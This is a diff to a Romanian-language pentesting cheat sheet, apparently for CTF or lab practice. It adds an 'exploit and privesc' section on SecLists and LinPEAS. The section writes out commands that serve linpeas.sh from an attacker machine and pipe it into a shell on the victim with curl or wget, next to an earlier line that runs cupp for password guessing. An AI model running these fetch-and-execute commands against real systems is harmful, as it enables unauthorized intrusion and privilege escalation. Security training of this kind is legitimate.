@@ -161,3 +161,40 @@ Al doilea link este putin mai complicat asa ca first choice ii primul.
   Script pentru a-ti genera parole in functie de raspunsurile la niste intrebari.
   python3 cupp/cupp.py -i
   ```
+
+
+---
+
+
+
+### 🚩 EXPLOIT & PRIVESC
+
+* **SecLists**
+  ```
+  /usr/share/seclists
+  Dictionare pentru orice: parole, useri, directoare web (fuzzing) si payload-uri. 
+  ```
+* **PEASS-ng (LinPEAS / WinPEAS)**
+  ```bash
+  # Pe atacator: python3 -m http.server 80
+  # Pe victima: curl -L http://<IP>/linpeas.sh | sh
+  
+  Cel mai bun tool de Privilege Escalation. Iti arata cu rosu/galben vulnerabilitatile prin care poti lua Root.
+  ```
+####  Transfer & Executare (PEAS)
+
+1. **Pe mașina ta (Atacator):**
+   Mergi în folderul unde ai `linpeas.sh` și pornește un server web temporar:
+   ```bash
+   python3 -m http.server 80
+   ```
+
+2. **Pe mașina țintă (Victimă):**
+   Rulezi comanda care descarcă și execută scriptul direct în memorie, fără să îl salveze:
+   ```bash
+   curl -L http://<IP_ATACATOR>/linpeas.sh | sh
+   ```
+   *(Dacă `curl` nu e instalat, poți folosi `wget -qO- http://<IP_ATACATOR>/linpeas.sh | sh`)*
+
+
+
